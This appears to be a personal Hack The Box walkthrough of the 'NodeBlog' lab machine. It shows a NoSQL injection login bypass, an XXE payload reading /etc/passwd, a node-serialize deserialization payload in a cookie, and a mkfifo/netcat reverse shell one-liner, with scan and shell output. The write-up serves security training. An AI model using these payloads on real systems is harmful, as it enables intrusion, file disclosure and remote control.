---
title: NodeBlog
date: 2026-08-23
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
lastmod: 2026-08-26T05:14:43.609Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/yourmachine" >}}

![YkABZlln.canvas](/ob/Canvas/YkABZlln.canvas)\
{{< canvas "YkABZlln.canvas" >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop/VPN]
└──╼ $nmap 10.129.96.160 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-23 16:55 HKT
Nmap scan report for 10.129.96.160
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
417/tcp  filtered onmux
5000/tcp open     upnp

Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds

```

### Port 5000

![Pasted image 20260823174738.png](/ob/Pasted%20image%2020260823174738.png)

### No-Sql

```
application/json
application/x-www-form-urlencoded
application/form-data
```

![Pasted image 20260825150944.png](/ob/Pasted%20image%2020260825150944.png)

JSON is not working due to the query inquiry\
![Pasted image 20260825163916.png](/ob/Pasted%20image%2020260825163916.png)

so I will use www.convertsimple.com/convert-query-string-to-json/ to help me to change to json

![Pasted image 20260825164021.png](/ob/Pasted%20image%2020260825164021.png)

with the password is `{"$ne": "bar"}` then login successful `{"$ne": "bar"}`

![Pasted image 20260825164924.png](/ob/Pasted%20image%2020260825164924.png)

```
POST /login HTTP/1.1
Host: 10.129.96.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.96.160:5000/login
Content-Type: application/json
Content-Length: 55
Origin: http://10.129.96.160:5000
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{
 "user": "admin",
  "password": {"$ne": "njkln"}
}
```

### Upload function

Now upload the normal image

```
┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $wget https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-e874-4392-88d4-60082f83771f.png  
--2026-08-26 09:54:21--  https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-e874-4392-88d4-60082f83771f.png
Resolving cdn.services-k8s.prod.aws.htb.systems (cdn.services-k8s.prod.aws.htb.systems)... 109.176.239.0
Connecting to cdn.services-k8s.prod.aws.htb.systems (cdn.services-k8s.prod.aws.htb.systems)|109.176.239.0|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 192714 (188K) [image/png]
Saving to: ‘9e4d90d0-e874-4392-88d4-60082f83771f.png’

9e4d90d0-e874-4392-88d4-60082f83771f.png            100%[=================================================================================================================>] 188.20K  --.-KB/s    in 0.06s   

2026-08-26 09:54:21 (2.96 MB/s) - ‘9e4d90d0-e874-4392-88d4-60082f83771f.png’ saved [192714/192714]

```

but it request the Invalid XML Example

![Pasted image 20260826102304.png](/ob/Pasted%20image%2020260826102304.png)

XML Injection

https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#tools

The example XXE payload is

````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data```
<post>
        <title>0xdf's Post</title>
        <description>Read File</description>
        <markdown>&file;</markdown>
</post>
```</data>
````

But you have to modify it to fulfil web's exception  , like it , the `&file;` is for calling back the /etc/passwd

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>0xdf's Post</title>
        <description>Read File</description>
        <markdown>&file;</markdown>
</post>
```

Use the `{` to toggle response error

![Pasted image 20260826103919.png](/ob/Pasted%20image%2020260826103919.png)

We can see the /opt/blog is the web env

### Web session / cookie analysis

![Pasted image 20260826104217.png](/ob/Pasted%20image%2020260826104217.png)

Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D

Burp auto decode

```
Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

We know it is used the Express and Node.js

![Pasted image 20260826104437.png](/ob/Pasted%20image%2020260826104437.png)

### Exploit

https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution

```
npm install node-serialize
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

list the file of Serialized function and try it my host

```
┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $cat log.js 
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

I will make the ping and reverse to cookie to ping me back

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.105', function(error, stdout, stderr){console.log(stdout)});}()"}
```

In the Decoder . rce --> url encode --> put in the cookie

![Pasted image 20260826111542.png](/ob/Pasted%20image%2020260826111542.png)

send it in the repeater

![Pasted image 20260826111521.png](/ob/Pasted%20image%2020260826111521.png)

Catch it

![Pasted image 20260826111731.png](/ob/Pasted%20image%2020260826111731.png)

### Shell

Used for `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.105 5000 >/tmp/f`

![Pasted image 20260826131438.png](/ob/Pasted%20image%2020260826131438.png)

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
└──╼ $nc -lvnp 5000
Listening on 0.0.0.0 5000
Connection received on 10.129.96.160 58814
bash: cannot set terminal process group (876): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ 
```
